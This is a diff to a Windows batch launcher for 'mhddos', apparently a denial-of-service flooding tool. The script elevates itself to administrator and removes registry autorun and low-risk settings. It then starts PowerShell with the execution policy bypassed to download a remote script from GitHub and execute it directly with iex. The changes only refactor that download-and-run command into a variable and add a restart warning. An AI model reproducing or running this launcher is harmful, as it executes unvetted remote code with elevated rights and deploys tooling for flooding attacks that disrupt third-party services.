@@ -2,6 +2,8 @@
 if not "%1"=="am_admin" ( powershell start -verb runas '%0' 'am_admin "%~1" "%~2"' & exit )
 call:REG_autorun_del
 call:REG_lowrisk_del
+set "_PS1_COMMAND=[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; cls; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/mhddos-proxy-py/main/mhddos.ps1'))"
+:: set "_PS1_COMMAND=Invoke-Command -FilePath '%~dp0\mhddos.ps1'"
 :: ----------------------------------------------------------------------------------------------------------------------------------
 :start
 :: Old [Windows] check
@@ -14,7 +16,7 @@ call:PWSHver
 if %_PWSHold% EQU 1 call:PWSHsetup
 :: Get command from ps1 on server
 :ps1
-start "mhddos" powershell -executionpolicy bypass -command "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; cls; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/mhddos-proxy-py/main/mhddos.ps1'))"
+start "mhddos" powershell -executionpolicy bypass -command "%_PS1_COMMAND%"
 :: End
 :end
 exit
@@ -88,6 +90,7 @@ exit /b 0
 
 :PWSHsetup
 echo ^(!^) Missing ^Powershell 3.0+
+echo ^(!^) ^[WARNING^] After the installation restart required
 pause
 call:mkdir-temp
 :PWSHsetup_download
